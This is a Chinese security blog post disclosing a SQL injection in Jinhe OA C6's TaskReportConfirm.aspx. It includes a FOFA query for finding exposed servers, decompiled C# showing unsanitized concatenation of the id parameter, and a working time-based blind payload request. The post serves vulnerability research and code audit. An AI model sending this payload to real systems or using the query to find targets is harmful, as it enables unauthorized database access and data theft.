---
title: "金和OA TaskReportConfirm.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-TaskReportConfirm-id-sqli.html
asset_dir: assets/金和oa-taskreportconfirm.aspx-sql注入漏洞
---

# 金和OA TaskReportConfirm.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/10 12:37
* 1345浏览
* [2评论](#comment)
* 29分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `TaskReportConfirm.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 TaskReportConfirm.aspx 的实现，在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `TaskReportConfirm` 的处理逻辑

```
  protected void Page_Load(object sender, EventArgs e)
  {
    if (this.Request["id"] != null)
      this.ReportID = this.Request["id"].ToString();
    if (this.Session["UserCode"] != null)
      this.UserID = this.Session["UserCode"].ToString();
    if (!this.IsPostBack)
      this.GetTaskReport();
    this.Globalization();
  }
```

再跟进 `GetTaskReport` 方法，其实现如下

代码安全审计

```
  private void GetTaskReport()
  {
    DataTable dataTable = Common.ExecSqlReDt($"select top 1 a.*,b.TaskID,b.TaskName,b.TaskExecutorID,b.TaskOthersID,b.TaskViewRegCode from TaskManageExecutorsay a inner join Taskmanage b on a.TaskID = b.TaskID where ID = '{this.ReportID}'");
    if (((InternalDataCollectionBase) dataTable.Rows).Count <= 0)
      return;
    this.txtTaskReportExplain.Value = dataTable.Rows[0]["TaskConfirmExplain"].ToString();
    ((Control) this).ViewState["TaskID"] = (object) dataTable.Rows[0]["TaskID"].ToString();
    ((Control) this).ViewState["TaskName"] = (object) dataTable.Rows[0]["TaskName"].ToString();
    ((Control) this).ViewState["TaskExecs"] = (object) $"{dataTable.Rows[0]["TaskExecutorID"].ToString()},{dataTable.Rows[0]["TaskOthersID"].ToString()}";
    ((Control) this).ViewState["TaskViewers"] = (object) dataTable.Rows[0]["TaskViewRegCode"].ToString();
  }
```

参数 `ReportID` 被直接拼接进 `ExecSqlReDt` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

在页面提交确认通过或不通过时，也存在SQL注入

[![金和OA TaskReportConfirm.aspx SQL注入漏洞](images/img-001-de27b9681d00.webp)](https://image.mrxn.net/017c4bcc084e4e36831dac4cc2884555.webp)

可以进入 `ConfirmTaskReport` 方法后，还可能进入 `ProjectTaskConfirm` 方法，二者均是存在sql注入的，其中 `ConfirmTaskReport` 方法实现如下

漏洞修复方案

```
public bool ConfirmTaskReport(
    string ReportID,
    string strUserID,
    string strConfirmFlag,
    string strExplain)
  {
    string QueryString = $" update TaskManageExecutorsay set TaskConfirmFlag = '{strConfirmFlag}',TaskConfirmExplain = '{strExplain}' where ID = '{ReportID}' ";
    if (string.op_Equality(strConfirmFlag, "1"))
      QueryString = $"{QueryString} declare @TaskID int,@TaskReportProgress decimal(8, 1),@SubHours decimal(18, 1)   select @TaskID = TaskID,@TaskReportProgress=taskrrecfinprogress,@SubHours=TaskRCost from TaskManageExecutorsay where ID = '{ReportID}'   update TaskManage set TaskWorkHour= TaskWorkHour + @SubHours where TaskID=@TaskID   exec pt_TaskReportProgress @TaskID,@TaskReportProgress ";
    DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
    dbOperator.ExecSQLReInt(QueryString);
```

# 漏洞复现

```
POST /c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

id='WAitFor DelaY'0:0:5'--
```

[![金和OA TaskReportConfirm.aspx SQL注入漏洞](images/img-002-a3d91710b8e0.webp)](https://image.mrxn.net/4e77284c27304cb29e815cfa9a7805f9.webp)

成功延时 5 秒钟

计算机服务器

ConfirmTaskReport

[![金和OA TaskReportConfirm.aspx SQL注入漏洞](images/img-003-f14b50f0a0b5.webp)](https://image.mrxn.net/7e170741a052469e88b3388f1d1c56ed.webp)

成功延时 10 秒（执行两次），还有其他参数也存在同样的[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA TaskReportConfirm.aspx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-TaskReportConfirm-id-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-TaskReportConfirm-id-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

编程

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-TaskReportConfirm-id-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入检测工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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